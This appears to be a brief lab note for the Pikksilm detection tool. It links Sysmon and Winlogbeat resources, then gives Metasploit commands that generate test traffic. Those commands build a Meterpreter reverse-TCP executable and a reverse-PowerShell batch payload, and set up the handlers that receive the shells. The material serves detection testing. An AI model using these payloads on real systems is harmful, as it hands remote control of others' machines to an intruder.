# Pikksilm

* [Pikksilm](https://github.com/markuskont/pikksilm)
* [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
* [sysmon modular](https://github.com/olafhartong/sysmon-modular)
* [verbose sysmon config](https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml)
* [Winlogbeat](https://www.elastic.co/beats/winlogbeat)

## Generating interesting traffic

* [installing metasploit on linux](https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/#installing-the-metasploit-framework-on-linux)

### Reverse TCP

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=53  -f exe > bad.exe
```

```
msfconsole

msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost eth0
msf6 exploit(multi/handler) > set lport 53
msf6 exploit(multi/handler) > exploit

meterpreter > dir

```

### Reverse PS

```
msfvenom -p cmd/windows/reverse_powershell lhost=eth0 lport=8089 > shell.bat
```

```
msfconsole

msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload cmd/windows/reverse_powershell
msf6 exploit(multi/handler) > set lhost eth0
msf6 exploit(multi/handler) > set LPORT 8089
msf6 exploit(multi/handler) > exploit
```
